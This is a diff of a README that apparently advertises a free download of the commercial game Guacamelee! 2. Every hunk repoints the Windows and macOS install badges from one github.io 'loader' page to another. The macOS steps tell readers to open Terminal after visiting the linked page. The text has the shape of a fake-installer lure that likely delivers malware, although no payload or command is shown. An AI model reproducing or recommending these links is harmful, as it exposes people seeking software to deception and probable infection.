@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Guacamelee! 2](https://img.shields.io/badge/⬇_Install_Guacamelee!+2-E63946?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![⬇ Install Guacamelee! 2](https://img.shields.io/badge/⬇_Install_Guacamelee!+2-E63946?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
@@ -61,9 +61,9 @@ Guacamelee! 2 is a vibrant metroidvania brawler developed by DrinkBox Studios, c
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://QuakeShadowDay.github.io/win-loader/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://shellwarlockfigure.github.io/windows-dl/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://QuakeShadowDay.github.io/mac-loader/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
 
 </div>
 
@@ -81,7 +81,7 @@ Guacamelee! 2 is a vibrant metroidvania brawler developed by DrinkBox Studios, c
 
 <div align="center">
 
-[![⬇ Install Guacamelee! 2](https://img.shields.io/badge/⬇_Install_Guacamelee!+2-E63946?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![⬇ Install Guacamelee! 2](https://img.shields.io/badge/⬇_Install_Guacamelee!+2-E63946?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
@@ -100,7 +100,7 @@ Guacamelee! 2 is a vibrant metroidvania brawler developed by DrinkBox Studios, c
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://QuakeShadowDay.github.io/mac-loader/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Guacamelee! 2 is a vibrant metroidvania brawler developed by DrinkBox Studios, c
 
 <div align="center">
 
-[![⬇ Install Guacamelee! 2](https://img.shields.io/badge/⬇_Install_Guacamelee!+2-E63946?style=for-the-badge&logo=github)](https://QuakeShadowDay.github.io/win-loader/)
+[![⬇ Install Guacamelee! 2](https://img.shields.io/badge/⬇_Install_Guacamelee!+2-E63946?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
 
 </div>
 
